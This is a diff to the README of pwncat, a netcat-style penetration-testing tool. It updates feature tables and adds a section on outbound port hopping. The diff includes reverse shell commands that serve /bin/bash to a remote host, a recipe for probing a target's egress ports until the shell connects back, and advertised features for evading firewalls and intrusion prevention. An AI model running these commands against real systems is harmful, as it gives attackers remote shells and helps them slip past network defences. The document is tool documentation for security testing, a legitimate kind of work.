@@ -134,7 +134,7 @@
  </tbody>
 <table>
 
-> <sup>[1] <a href="https://cytopia.github.io/pwncat/pwncat.type.html">mypy type coverage</a> <strong>(fully typed: 93.51%)</strong></sup><br/>
+> <sup>[1] <a href="https://cytopia.github.io/pwncat/pwncat.type.html">mypy type coverage</a> <strong>(fully typed: 93.54%)</strong></sup><br/>
 > <sup>[2] Windows builds are currently only failing, because they are simply stuck on GitHub actions.</sup>
 
 
@@ -177,7 +177,7 @@ pwncat -l -e '/bin/bash' 8080
 ```
 ```bash
 # Reverse shell (Ctrl+c proof)
-pwncat -e '/bin/bash' example.com 4444 --recon --recon-wait 10
+pwncat -e '/bin/bash' example.com 4444 --recon -1 --recon-wait 10
 ```
 ```bash
 # Reverse UDP shell (Ctrl+c proof)
@@ -223,14 +223,15 @@ pwncat -R 10.0.0.1:4444 everythingcli.org 3306 -u
 | Reverse shell  | Create reverse shells |
 | Port Forward   | Local and remote port forward (Proxy server/client) |
 | <kbd>Ctrl</kbd>+<kbd>c</kbd> | Reverse shell can reconnect if you accidentally hit <kbd>Ctrl</kbd>+<kbd>c</kbd> |
-| Detect Egress  | Scan and report open egress ports on the target |
-| Evade FW       | Evade egress firewalls by round-robin outgoing ports |
-| Evade IPS      | Evade Intrusion Prevention Systems by being able to round-robin outgoing ports on connection interrupts |
+| Detect Egress  | Scan and report open egress ports on the target (port hopping) |
+| Evade FW       | Evade egress firewalls by round-robin outgoing ports (port hopping) |
+| Evade IPS      | Evade Intrusion Prevention Systems by being able to round-robin outgoing ports on connection interrupts (port hopping) |
 | UDP rev shell  | Try this with the traditional `netcat` |
 | TCP / UDP      | Full TCP and UDP support |
-| Python 2+3     | Works with Python 2 and Python 3 |
-| Cross OS       | Should work on Linux, MacOS and Windows as long as Python is available |
+| Python 2+3     | Works with Python 2, Python 3, pypy2 and pypy3 |
+| Cross OS       | Work on Linux, MacOS and Windows as long as Python is available |
 | Compatability  | Use the traditional `netcat` as a client or server together with `pwncat` |
+| Portable       | Single file which only uses core packages - no external dependencies required. |
 
 
 ### Feature comparison matrix
@@ -247,7 +248,7 @@ pwncat -R 10.0.0.1:4444 everythingcli.org 3306 -u
 | SCTP                | :x:    | :x:     | ✔   |
 | Command exec        | ✔      | ✔       | ✔   |
 | Inbound port scan   | *      | ✔       | ✔   |
-| Outbound port scan  | *      | :x:     | :x: |
+| Outbound port scan  | ✔      | :x:     | :x: |
 | Hex dump            | *      | ✔       | ✔   |
 | Telnet              | :x:    | ✔       | ✔   |
 | SSL                 | :x:    | :x:     | ✔   |
@@ -263,7 +264,7 @@ pwncat -R 10.0.0.1:4444 everythingcli.org 3306 -u
 | Proxy               | :x:    | ✔       | ✔   |
 | UDP reverse shell   | ✔      | :x:     | :x: |
 | Respawning client   | ✔      | :x:     | :x: |
-| Port hopping        | *      | :x:     | :x: |
+| Port hopping        | ✔      | :x:     | :x: |
 | Emergency shutdown  | ✔      | :x:     | :x: |
 
 > <sup>`*` Feature is currently under development.
@@ -701,7 +702,7 @@ tail -fn50 comm.txt
      |                 |      |      | pwncat          |      |      | MySQL           |
      | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |
      +-----------------+      |      +-----------------+      |      +-----------------+
-     pwncat -l 4444           |      pwncat --reconn \        |
+     pwncat -l 4444           |      pwncat --reconn -1 \     |
                               |        -R 56.0.0.1:4444 \     |
                               |        10.0.0.1 3306          |
 ```
@@ -722,13 +723,47 @@ tail -fn50 comm.txt
      |                 |      |      | pwncat          |      |      | MySQL           |
      | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |
      +-----------------+      |      +-----------------+      |      +-----------------+
-     pwncat -u -l 53          |      pwncat -u --reconn \     |
+     pwncat -u -l 53          |      pwncat -u --reconn -1 \  |
                               |        -R 56.0.0.1:4444 \     |
                               |        10.0.0.1 3306          |
 ```
 <!--
 </details>
 -->
+
+
+### Outbound port hopping
+
+If you have no idea what outbound ports are allowed from the target machine, you can instruct
+the client (e.g.: in case of a reverse shell) to probe outbound ports endlessly.
+
+```bash
+# Reverse shell on target (the client)
+# --exec            # The command shell the client should provide
+# --reconn          # Instruct it to reconnect endlessly
+# --reconn-wait     # Reconnect every 0.1 seconds
+# --reconn-robin    # Use these ports to probe for outbount connections
+
+pwncat --exec /bin/bash --reconn -1 --reconn-wait 0.1 --reconn-robin 54-1024 10 10.0.0.1 53
+```
+
+Once the client is up and running, either use raw sockets to check for inbound traffic or use
+something like Wireshark or tcpdump to find out from where the client is able to connect back to you,
+
+If you found one or more ports that the client is able to connect to you,
+simply start your listener locally and wait for it to come back.
+```bash
+pwncat -l <ip> <port>
+```
+If the client connects to you, you will have a working reverse shell. If you stop your local
+listening server accidentally or on purpose, the client will probe ports again until it connects successfully.
+In order to kill the reverse shell client, you can use `--safe-word` (when starting the client).
+
+
+If none of this succeeds, you can add other measures such as using UDP or even wrapping your
+packets into higher level protocols, such as HTTP or others. See [PSE](pse) or examples below
+for how to transform your traffic.
+
 
 ### Pwncat Scripting Engine ([PSE](pse))
 
